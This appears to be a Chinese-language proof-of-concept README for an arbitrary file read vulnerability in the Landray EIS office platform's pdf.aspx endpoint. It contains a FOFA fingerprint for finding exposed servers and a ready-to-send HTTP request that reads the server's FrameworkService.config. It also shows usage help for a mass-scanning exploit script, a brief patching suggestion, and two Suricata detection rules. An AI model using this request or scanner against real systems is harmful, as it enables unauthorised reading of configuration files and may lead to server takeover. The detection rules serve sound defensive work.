### 产品简介  
蓝凌EIS智慧协同平台是一个简单、高效的工作方式专为成长型企业打造的沟通、协同、社交的移动办公平台，覆盖OA、沟通、客户、人事、知识等管理需求，集合了非常丰富的模块，满足组织企业在知识、项目管理系统建设等需求的一款OA系统。  

### 漏洞概述  
蓝凌EIS智慧协同平台pdf.aspx文件存在任意文件读取漏洞。攻击者可通过该漏洞在服务器端读取任意文件敏感内容，可能导致攻击者后续获取到相关的服务器权限。  

### 指纹识别  
fofa: icon_hash=“953405444”  

![Image text](https://github.com/YUUKI4O4/POC/tree/main/%E8%93%9D%E5%87%8C/Lanling_EIS_File_read_vulnerability/1.png)
![Image text](https://github.com/YUUKI4O4/POC/tree/main/%E8%93%9D%E5%87%8C/Lanling_EIS_File_read_vulnerability/2.png)

### 漏洞利用  
```
poc:
GET /EIS/service/pdf.aspx?path=/FrameworkService.config HTTP/1.1
Host: your_ip
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Connection: close
Upgrade-Insecure-Requests: 1


```

### 测试和利用脚本  
```
python3 Lanling_EIS_File_read_vulnerability.py -h
usage: Lanling_EIS_File_read_vulnerability.py [-h] [-t] [-r FILE] [-u URL]

### LanLing EIS pdf.aspx Arbitrary File Reading Vulnerability. ###

options:
  -h, --help            show this help message and exit
  -t, --target_collection
                        Perform target collection
  -r FILE, --multi_objective_testing FILE
                        Perform multi-objective testing. e.g:python Lanling_EIS_File_read_vulnerability.py
                        -r ./url.txt
  -u URL, --single_objective_testing URL
                        Perform single-objective testing. e.g:python Lanling_EIS_File_read_vulnerability.py
                        -u http://xxx.xxx.xxx
```

### 修复建议  
1.联系相关软件厂商更新至最新安全版本。  

### Suricata rules  
```
alert http any any -> any any (msg:"LanLing EIS pdf.aspx Arbitrary File Reading Vulnerability."; flow:established,to_server; flowbits:set,Lanling_EIS_File_read_vulnerability; content:"get";http_method;nocase; content:"/EIS/service/pdf.aspx?path=";http_uri;fast_pattern;nocase; reference:url,https://github.com/YUUKI4O4/POC/tree/main/%E8%93%9D%E5%87%8C/Lanling_EIS_File_read_vulnerability; classtype:web-attck; metadata:created_at 2024-01-15,updated_at 2024-01-15,creater:YUUKI4O4; sid:17; rev:1;)
alert http any any -> any any (msg:"LanLing EIS pdf.aspx Arbitrary File Reading Vulnerability Success."; flow:established,from_server; flowbits:isset,Lanling_EIS_File_read_vulnerability; content:"200";http_stat_code; pcre:"/^([A-Za-z0-9+/]{4})*([A-Za-z0-9+/]{4}|[A-Za-z0-9+/]{3}=|[A-Za-z0-9+/]{2}==)$/Q"; reference:url,https://github.com/YUUKI4O4/POC/tree/main/%E8%93%9D%E5%87%8C/Lanling_EIS_File_read_vulnerability; classtype:web-attck; metadata:created_at 2024-01-15,updated_at 2024-01-15,creater:YUUKI4O4; sid:18; rev:1;)
```
